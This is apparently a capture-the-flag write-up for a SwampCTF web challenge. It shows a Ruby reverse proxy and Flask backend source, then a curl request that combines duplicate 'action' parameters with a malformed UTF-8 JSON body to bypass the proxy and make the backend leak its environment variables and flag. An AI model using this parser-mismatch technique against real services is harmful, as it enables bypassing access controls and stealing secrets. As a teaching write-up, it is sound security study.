# Challenge description

I have created a safe reverse proxy that only forwards requests to retrieve debug information from the backend. What could go wrong?

# Soluce

When we open the source code of the website, there is two importants files:

```ruby
require 'sinatra'
require 'rack/proxy'
require 'json'

class ReverseProxy < Rack::Proxy
  def perform_request(env)
    request = Rack::Request.new(env)

    # Only allow requests to the /api?action=getInfo endpoint
    if request.params['action'] == 'getInfo'
      env['HTTP_HOST'] = 'backend:5000'
      env['PATH_INFO'] = '/api'
      env['QUERY_STRING'] = request.query_string
      body = request.body.read
      env['rack.input'] = StringIO.new(body)
      
      begin
        json_data = JSON.parse(body)
        puts "Received valid JSON data: #{json_data}"
        super(env)
      rescue JSON::ParserError => e
        puts "Error parsing JSON: #{e.message}"
        return [200, { 'Content-Type' => 'application/json' }, [{ message: "Error parsing JSON", error: e.message }.to_json]]
      end
    else
      [200, { 'Content-Type' => 'text/plain' }, ["Unauthorized"]]
    end
  end
end

use ReverseProxy

set :bind, '0.0.0.0'
set :port, 8080
puts "Server is listening on port 8080..."
```

And

```python
from flask import Flask, jsonify, request
import os
import logging

app = Flask(__name__)

app.config['DEBUG'] = os.getenv('DEBUG', 'False')
app.config['LOG_LEVEL'] = os.getenv('LOG_LEVEL', 'warning')


@app.route('/api', methods=['POST'])
def api():
    param = request.args.get('action')
    app.logger.info(f"Received param: {param}")

    if param == 'getFlag':
        try:
            data = request.get_json()
            app.logger.info(f"Received JSON data: {data}")
            return jsonify(message="Prased JSON successfully")
        except Exception as e:
            app.logger.error(f"Error parsing JSON: {e}")
            debug_data = {
                'headers': dict(request.headers),
                'method': request.method,
                'url': request.url,
                'env_vars': {key: value for key, value in os.environ.items()}
            }
            return jsonify(message="Something broke!!", debug_data=debug_data)

    if param == 'getInfo':
        debug_status = app.config['DEBUG']
        log_level = app.config['LOG_LEVEL']
        return jsonify(message="Info retrieved successfully!", debug=debug_status, log_level=log_level)

    return jsonify(message="Invalid action parameter!", param=param)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

So there is a reverse proxy that only allows requests to the `/api?action=getInfo` endpoint. But in the backend, we can see that there is a `getFlag` endpoint that is not allowed by the reverse proxy. 

We will call the endpoint `/api?action=getFlag` with a POST request by calling getFlag and getInfo to bypass the reverse proxy. 

Now we have to bypass the `json_data = JSON.parse(body)` in the reverse proxy and make crash the backend on the `data = request.get_json()` line in the `getFlag` route. The flag is probably in the environment variables.

We will do this with the following command:

```sh
┌──(virgile㉿localhost)-[~/Téléchargements]
└─$ curl -X POST 'http://chals.swampctf.com:41234/api?action=getFlag&action=getInfo'   -H 'Content-Type: application/json'   --data-binary '{"a":"\xFF"}'
{
  "debug_data": {
    "env_vars": {
      "DATABASE_URL": "sqlite:///app.db", 
      "DEBUG": "True", 
      "ENV": "development", 
      "FLASK_ENV": "development", 
      "GPG_KEY": "E3FF2839C048B25C084DEBE9B26995E310250568", 
      "HOME": "/root", 
      "HOSTNAME": "7b5833412723", 
      "LANG": "C.UTF-8", 
      "LOG_LEVEL": "info", 
      "PATH": "/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 
      "PYTHON_SHA256": "3126f59592c9b0d798584755f2bf7b081fa1ca35ce7a6fea980108d752a05bb1", 
      "PYTHON_VERSION": "3.9.21", 
      "SECRET_KEY": "swampCTF{1nt3r0p3r4b1l1ty_p4r4m_p0llut10n_x7q9z3882e}", 
      "WERKZEUG_RUN_MAIN": "true", 
      "WERKZEUG_SERVER_FD": "3"
    }, 
    "headers": {
      "Accept": "*/*", 
      "Content-Length": "12", 
      "Content-Type": "application/json", 
      "Host": "backend:5000", 
      "User-Agent": "curl/8.12.1", 
      "Version": "HTTP/1.1", 
      "X-Forwarded-For": "62.235.211.9"
    }, 
    "method": "POST", 
    "url": "http://backend:5000/api?action=getFlag&action=getInfo"
  }, 
  "message": "Something broke!!"
}
```

This works because the reverse proxy (written in Ruby using Sinatra) parses the request body using JSON.parse, which is tolerant and accepts the input {"a":"\xFF"} as valid JSON. However, on the backend, Flask attempts to decode the request body as UTF-8 before parsing it as JSON. Since the byte \xFF is not valid in UTF-8, this triggers a UnicodeDecodeError in Python. The error is caught by the try/except block in the getFlag route, which responds with a debug payload that includes environment variables—potentially exposing sensitive data such as the flag.

So the flag is `swampCTF{1nt3r0p3r4b1l1ty_p4r4m_p0llut10n_x7q9z3882e}`.